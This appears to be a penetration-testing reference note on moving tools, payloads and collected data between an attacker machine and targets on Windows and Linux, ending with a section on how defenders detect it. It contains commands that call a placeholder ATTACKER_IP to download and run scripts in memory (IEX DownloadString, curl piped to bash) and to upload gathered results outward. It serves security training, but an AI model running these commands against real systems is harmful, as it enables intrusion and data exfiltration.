# File Transfers

---

## Executive Summary

File transfers are a core operational skill during security assessments. They allow testers to move tools, payloads, scripts, logs, and collected evidence between attacker-controlled systems and target systems.

The best transfer method depends on the operating system, available tools, firewall rules, endpoint defenses, and whether the goal is to download, upload, or move data through a restricted environment.

## Common Transfer Scenarios

| Scenario | Description |
|---|---|
| Download to target | Moving tools or payloads from the attacker machine to the target |
| Upload from target | Moving collected data or evidence from the target back to the attacker machine |
| Internal transfer | Moving files between compromised systems inside a network |
| Fileless transfer | Loading code directly into memory without writing a file to disk |
| Protected transfer | Encrypting sensitive files before moving them over an insecure channel |

## Windows File Transfers

Windows environments often provide several built-in transfer options.

Common methods include:

- PowerShell web downloads
- `certutil`
- BITS transfers
- SMB shares
- FTP
- WinRM copy operations
- RDP drive mounting
- Base64 copy and paste
- JavaScript or VBScript downloaders

## PowerShell Downloads

PowerShell can download files over HTTP or HTTPS.

```powershell
Invoke-WebRequest http://ATTACKER_IP/file.exe -OutFile C:\Users\Public\file.exe
```

Older PowerShell environments may require:

```powershell
Invoke-WebRequest http://ATTACKER_IP/file.exe -OutFile C:\Users\Public\file.exe -UseBasicParsing
```

PowerShell can also execute downloaded content directly in memory:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')
```

This is useful operationally, but it is also heavily monitored by defenders.

## SMB Transfers

SMB is useful inside Windows-heavy environments.

On the attacker machine:

```bash
sudo impacket-smbserver share /tmp/smbshare -smb2support
```

From the Windows target:

```cmd
copy \\ATTACKER_IP\share\file.exe C:\Users\Public\file.exe
```

If authentication is required:

```cmd
net use Z: \\ATTACKER_IP\share /user:test test
copy Z:\file.exe C:\Users\Public\file.exe
```

## FTP Transfers

FTP can be useful when simple HTTP or SMB transfer is not available.

Start an FTP server on the attacker machine:

```bash
sudo python3 -m pyftpdlib --port 21
```

Download from Windows with PowerShell:

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://ATTACKER_IP/file.txt', 'C:\Users\Public\file.txt')
```

## Linux File Transfers

Linux systems usually provide flexible native transfer options.

Common methods include:

- `wget`
- `curl`
- Python HTTP servers
- SCP
- Netcat
- Ncat
- Socat
- Bash `/dev/tcp`
- Base64 copy and paste

## HTTP Downloads

Start a simple web server on the attacker machine:

```bash
python3 -m http.server 8000
```

Download with `wget`:

```bash
wget http://ATTACKER_IP:8000/file.sh -O /tmp/file.sh
```

Download with `curl`:

```bash
curl -o /tmp/file.sh http://ATTACKER_IP:8000/file.sh
```

## Fileless Linux Execution

Linux can pipe downloaded content directly into an interpreter.

```bash
curl http://ATTACKER_IP/script.sh | bash
```

```bash
wget -qO- http://ATTACKER_IP/script.py | python3
```

This avoids writing the script to disk, but it may still be visible in process, shell, and network logs.

## SCP Transfers

SCP is useful when SSH is available.

Download from attacker machine to target:

```bash
scp user@ATTACKER_IP:/tmp/tool.sh .
```

Upload from target to attacker machine:

```bash
scp /tmp/results.txt user@ATTACKER_IP:/tmp/
```

## Netcat Transfers

Netcat can move files through raw TCP connections.

Receiver:

```bash
nc -lvnp 9001 > file.out
```

Sender:

```bash
nc TARGET_IP 9001 < file.in
```

With Ncat:

```bash
ncat -l -p 9001 --recv-only > file.out
```

```bash
ncat TARGET_IP 9001 --send-only < file.in
```

## Base64 Transfers

Base64 transfer is useful when direct file transfer is blocked but terminal access is available.

Encode on Linux:

```bash
cat file.bin | base64 -w 0
```

Decode on Linux:

```bash
echo 'BASE64_STRING' | base64 -d > file.bin
```

Decode on Windows with PowerShell:

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\file.bin", [Convert]::FromBase64String("BASE64_STRING"))
```

Always verify integrity after transfer:

```bash
md5sum file.bin
```

```powershell
Get-FileHash C:\Users\Public\file.bin -Algorithm MD5
```

## Code-Based Transfers

When common tools are unavailable, installed interpreters can sometimes download files.

Python 3:

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://ATTACKER_IP/file.sh", "file.sh")'
```

PHP:

```bash
php -r '$f=file_get_contents("http://ATTACKER_IP/file.sh"); file_put_contents("file.sh",$f);'
```

Ruby:

```bash
ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI.parse("http://ATTACKER_IP/file.sh")))'
```

Perl:

```bash
perl -e 'use LWP::Simple; getstore("http://ATTACKER_IP/file.sh", "file.sh");'
```

## Protected File Transfers

Sensitive files should not be transferred in plaintext when avoidable.

Examples of sensitive files include:

- Credential dumps
- Password hashes
- Internal enumeration results
- Client data
- Configuration files
- Database exports
- Forensic evidence

Encrypt files before transferring them over untrusted channels.

Linux encryption with OpenSSL:

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in sensitive.txt -out sensitive.enc
```

Decrypt:

```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in sensitive.enc -out sensitive.txt
```

## Catching Uploads with HTTP

A Python upload server can receive files over HTTP.

```bash
python3 -m pip install uploadserver
python3 -m uploadserver 8000
```

Upload from Linux:

```bash
curl -X POST http://ATTACKER_IP:8000/upload -F 'files=@/tmp/results.txt'
```

For more controlled operations, Nginx can be configured to accept HTTP `PUT` uploads into a specific directory.

## Operational Considerations

Before transferring files, check:

- Is the directory writable?
- Is the file likely to trigger antivirus or EDR?
- Is the transfer method logged?
- Does the target have outbound internet access?
- Are SMB, FTP, SSH, or HTTP blocked?
- Is the file sensitive enough to require encryption?
- Can the task be done with built-in tools?
- Will the transfer create suspicious network traffic?

## Defensive Perspective

File transfers can be detected through:

- Command-line logging
- PowerShell logging
- Proxy logs
- DNS logs
- Firewall logs
- EDR file creation events
- Suspicious User-Agent strings
- Unusual outbound connections
- Living-off-the-land binary abuse

Defenders should pay close attention to command-line tools downloading executable content, scripts reaching out to direct IP addresses, and unusual file movement from sensitive systems.